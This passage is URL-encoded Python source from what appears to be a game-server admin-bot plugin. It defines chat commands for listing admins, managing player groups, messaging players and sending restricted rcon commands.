20len(clist)%20%3E%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20nlist%20%3D%20%5B%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20c%20in%20clist%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20c.maskGroup%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20nlist.append('%25s%5E7%20%5B%5E3%25s%5E7%5D'%20%25%20(c.exactName%2C%20c.maskGroup.level))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20nlist.append('%25s%5E7%20%5B%5E3%25s%5E7%5D'%20%25%20(c.exactName%2C%20c.maxLevel))%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('admins'%2C%20'%2C%20'.join(nlist)))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20msg%20%3D%20self.getMessage('no_admins')%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20msg%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('no_admins'))%0A%09%09%09%09%0A%20%20%20%20def%20cmd_vip(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20lists%20all%20the%20online%20VIPs%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20clist%20%3D%20self.console.clients.getClientsByLevel(10%2C%2010%2C%20masked%3DTrue)%0A%20%20%20%20%20%20%20%20if%20len(clist)%20%3E%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20nlist%20%3D%20%5B%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20c%20in%20clist%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20nlist.append('%5E2%25s%5E7%20%5B%5E3%25s%5E7%5D'%20%25%20(c.exactName%2C%20c.id))%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'VIPs%20online%3A%20%25s'%20%25%20'%2C%20'.join(nlist))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'There%20are%20no%20VIPs%20online')%0A%09%09%09%09%0A%20%20%20%20def%20cmd_maskedadmins(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20lists%20all%20the%20online%20masked%20admins%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20clist%20%3D%20self.console.clients.getClientsByLevel(self._admins_level%2C%20100%2C%20masked%3DTrue)%0A%20%20%20%20%20%20%20%20if%20len(clist)%20%3E%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20nlist%20%3D%20%5B%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20c%20in%20clist%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20c.maskGroup%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20nlist.append('%25s%5E7%20%5B%5E3%25s%5E7%5D'%20%25%20(c.exactName%2C%20c.maxLevel))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pass%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20len(nlist)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('masked_admins'%2C%20'%2C%20'.join(nlist)))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('no_masked_admins'))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20msg%20%3D%20self.getMessage('no_masked_admins')%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20msg%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('no_masked_admins'))%0A%0A%20%20%20%20def%20cmd_rebuild(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20sync%20up%20connected%20players%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20self.console.clients.sync()%0A%20%20%20%20%20%20%20%20client.message('synchronizing%20client%20info')%0A%0A%20%20%20%20def%20cmd_regtest(self%2C%20cid%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20display%20your%20current%20user%20status%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20client%20and%20client.maskGroup%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('leveltest'%2C%20client.exactName%2C%20client.id%2C%20client.maskGroup.name%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.maskGroup.level%2C%20self.console.formatTime(client.timeAdd)))%0A%20%20%20%20%20%20%20%20elif%20client%20and%20client.maxGroup%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('leveltest'%2C%20client.exactName%2C%20client.id%2C%20client.maxGroup.name%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.maxLevel%2C%20self.console.formatTime(client.timeAdd)))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('leveltest'%2C%20client.exactName%2C%20client.id%2C%20'no%20groups'%2C%200%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.formatTime(client.timeAdd)))%0A%0A%20%20%20%20def%20cmd_admintest(self%2C%20cid%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20display%20your%20current%20user%20status%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20return%20self.cmd_regtest(cid%2C%20client%2C%20cmd)%0A%0A%20%20%20%20def%20cmd_leveltest(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%5B%3Cname%3E%5D%20-%20display%20a%20user's%20status%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(m%5B0%5D%2C%20client)%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20client%0A%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20not%20sclient.maxGroup%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('leveltest_nogroups'%2C%20sclient.exactName%2C%20sclient.id))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.getMessage('leveltest'%2C%20sclient.exactName%2C%20sclient.id%2C%20sclient.maxGroup.name%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.maxLevel%2C%20self.console.formatTime(sclient.timeAdd)))%0A%0A%20%20%20%20def%20cmd_noc(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%5B%3Cname%3E%5D%20-%20display%20a%20user's%20status%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(m%5B0%5D%2C%20client)%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20client%0A%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20not%20sclient.maxGroup%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%25s%5B%25s%5D%20is%20user(1)%2C%20connected%20%25s%20times'%20%25%20(sclient.exactName%2C%20sclient.id%2C%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.connections))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%25s%5B%25s%5D%20is%20%25s(%25s)%2C%20connected%20%25s%20times'%20%25%20(sclient.exactName%2C%20sclient.id%2C%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.maxGroup.name%2C%20sclient.maxGroup.level%2C%20sclient.connections))%09%09%09%09%09%09%09%09%0A%0A%20%20%20%20def%20cmd_makereg(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20-%20add%20a%20player%20in%20the%20'regular'%20group%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20cid%20%3D%20m%5B0%5D%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20group%20%3D%20Group(keyword%3D'reg')%0A%20%20%20%20%20%20%20%20%20%20%20%20group%20%3D%20self.console.storage.getGroup(group)%0A%20%20%20%20%20%20%20%20except%20Exception%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7Group%20%5E1reg%20%5E7does%20not%20exist')%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(cid%2C%20client)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.inGroup(group)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('groups_already_in'%2C%20sclient.exactName%2C%20group.name))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20elif%20sclient.maxLevel%20%3E%3D%20group.level%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7%25s%5E7%20is%20already%20in%20a%20higher%20level%20group'%20%25%20sclient.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.setGroup(group)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.save()%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('groups_put'%2C%20sclient.exactName%2C%20group.name))%0A%0A%20%20%20%20def%20cmd_unreg(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20-%20remove%20a%20player%20from%20the%20'regular'%20group%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20cid%20%3D%20m%5B0%5D%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20group_reg%20%3D%20self.console.storage.getGroup(Group(keyword%3D'reg'))%0A%20%20%20%20%20%20%20%20except%20Exception%2C%20err%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.debug(err)%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(%22%5E7Group%20%5E1regular%20%5E7does%20not%20exist%22)%0A%20%20%20%20%20%20%20%20else%3A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20group_user%20%3D%20self.console.storage.getGroup(Group(keyword%3D'user'))%0A%20%20%20%20%20%20%20%20%20%20%20%20except%20Exception%2C%20err%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.debug(err)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(%22%5E7Group%20%5E1user%20%5E7does%20not%20exist%22)%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(cid%2C%20client)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.inGroup(group_reg)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.remGroup(group_reg)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.setGroup(group_user)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.save()%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%5E7%25s%5E7%20removed%20from%20group%20%25s'%20%25%20(sclient.exactName%2C%20group_reg.name))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7%25s%5E7%20is%20not%20in%20group%20%25s'%20%25%20(sclient.exactName%2C%20group_reg.name))%0A%0A%20%20%20%20def%20cmd_putgroup(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cclient%3E%20%3Cgroup%3E%20-%20add%20a%20client%20to%20a%20group%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20re.match('%5E(.%7B2%2C%7D)%20(%5Ba-z%5D%5Ba-z0-9%5D%2B)%24'%2C%20data%2C%20re.I)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20cid%2C%20keyword%20%3D%20m.groups()%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20group%20%3D%20Group(keyword%3Dkeyword)%0A%20%20%20%20%20%20%20%20%20%20%20%20group%20%3D%20self.console.storage.getGroup(group)%0A%20%20%20%20%20%20%20%20except%20Exception%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('group_unknown'%2C%20%7B'group_name'%3A%20keyword%7D))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20group.level%20%3E%3D%20client.maxLevel%20and%20client.maxLevel%20%3C%20100%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('group_beyond_reach'%2C%20%7B'group_name'%3A%20group.name%7D))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(cid%2C%20client)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.inGroup(group)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('groups_already_in'%2C%20sclient.exactName%2C%20group.name))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.setGroup(group)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.save()%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('groups_put'%2C%20sclient.exactName%2C%20group.name))%0A%09%09%09%09%09%09%0A%20%20%20%20def%20cmd_pm(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20%3Cmessage%3E%20-%20Send%20a%20private%20message%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%20%20%20%20%20%20%20%20if%20not%20m%5B1%5D%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E1ERROR%3A%20%5E7You%20must%20supply%20a%20message')%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20message%20%3D%20m%5B1%5D%0A%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(m%5B0%5D%2C%20client)%0A%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient.message('%5E7From%20%5E5%25s%3A%20%5E7%25s'%20%25%20(client.exactName%2C%20message))%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7Message%20sent%20to%20%5E5%25s'%20%25%20sclient.exactName)%0A%0A%20%20%20%20def%20cmd_rcon(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3CGet%7CSend%3E%20%3Ccommand%3E%20-%20Get%2Fsend%20rcon%20command%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20not%20client.guid%20in%20_master%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E1You%20Are%20Not%20Allowed%20To%20Use%20This%20Command.')%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%20%20%20%20%20%20%20%20if%20not%20data%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('Please%20Enter%20data%2C%20or%20for%20help%20type%20!help%20rcon')%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%20%20%20%20%20%20%20%20elif%20data%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20input%20%3D%20data.split('%20'%2C1)%0A%20%20%20%20%20%20%20%20if%20input%5B0%5D%20%3D%3D%20%22get%22%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20getcvar%20%3D%20self.console.getCvar('%25s'%20%25%20input%5B1%5D)%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%25s'%20%25%20(getcvar))%0A%20%20%20%20%20%20%20%20if%20input%5B0%5D%20%3D%3D%20%22send%22%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.console.write('%25s'%20%25%20(input%5B1%5D))%0A%0A%20%20%20%20def%20cmd_screensay(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cmessage%3E%20-%20Broadcast%20message%20in%20center%20of%20the%20screen%20to%20all%20players%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20not%20data%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E1ERROR%3A%20%5E7You%20must%20supply%20a%20message')%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.console.write('screensay%20%25s'%20%25%20data)%0A%0A%20%20%20%20def%20cmd_screentell(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cmessage%3E%20-%20Broadcast%20message%20in%20center%20of%20the%20screen%20to%20a%20specific%20player%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%20%20%20%20%20%20%20%20if%20not%20m%5B1%5D%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E1ERROR%3A%20%5E7You%20must%20supply%20a%20message')%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20message%20%3D%20m%5B1%5D%0A%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(m%5B0%5D%2C%20client)%0A%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.console.write('screentell%20%25s%20%25s'%20%25%20(sclient.cid%2C%20message))%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7Message%20sent%20to%20%5E5%25s'%20%25%20sclient.exactName)%0A%09%09%09%0A%20%20%20%20def%20cmd_guid(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%5B%3Cname%3E%5D%20-%20display%20a%20user's%20(G)UID%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(m%5B0%5D%2C%20client)%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20client%0A%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.pbid%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%25s%20UID%20is%3A%20%40%25s'%20%25%20(sclient.exactName%2C%20sclient.pbid))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%25s%20GUID%20is%3A%20%25s'%20%25%20(sclient.exactName%2C%20sclient.guid%5B-8%3A%5D))%0A%09%09%09%09%0A%20%20%20%20def%20cmd_b3id(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%5B%3Cname%3E%5D%20-%20display%20a%20user's%20B3%20ID%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(m%5B0%5D%2C%20client)%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20client%0A%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('%25s%20B3%20ID%20is%3A%20%25s'%20%25%20(sclient.exactName%2C%20sclient.id))%0A%0A%0A%20%20%20%20def%20cmd_gamerangerid(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%5B%3Cname%3E%5D%20-%20display%20a%20user's%20GameRanger%20ID%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(m%5B0%5D%2C%20client)%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20client%0A%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20not%20'GameRa'%20in%20client.guid%5B%3A6%5D%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%25s%20Does%20not%20use%20GameRanger%20to%20play%20on%20this%20server'%20%25%20sclient.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%25s%20GameRanger%20ID%20is%3A%20%25s'%20%25%20(sclient.exactName%2C%20sclient.guid%5B-7%3A%5D))%0A%0A%20%20%20%20def%20cmd_calladmin(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cmessage%3E%20-%20Send%20a%20private%20message%20to%20all%20online%20admins.%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20not%20data%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E1ERROR%3A%20%5E7You%20must%20supply%20a%20message')%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20clist%20%3D%20%5B%5D%0A%0A%20%20%20%20%20%20%20%20players%20%3D%20self.console.clients.getClientsByLevel()%0A%20%20%20%20%20%20%20%20for%20_p%20in%20players%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20_p.maxLevel%20%3E%202%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20clist.append(_p)%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pass%0A%0A%20%20%20%20%20%20%20%20if%20len(clist)%20%3E%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20adm%20in%20clist%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20adm.message('%25s%20-%20From%3A%20%25s(%23%25s)'%20%25%20(data%2C%20client.exactName%2C%20client.cid))%0A%0A%20%20%20%20def%20cmd_say(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20say%20a%20message%20to%20all%20players%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20self.console.say(self.getMessage('say'%2C%20client.exactName%2C%20data))%0A%0A%20%20%20%20def%20cmd_ungroup(self%2C%20cid%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cclient%3E%20%3Cgroup%3E%20-%20remove%20a%20client%20from%20a%20group%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20re.match('%5E(%5B%5E%20%5D%7B2%2C%7D)%20(%5Ba-z%5D%2B)%24'%2C%20cid)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20cid%2C%20ke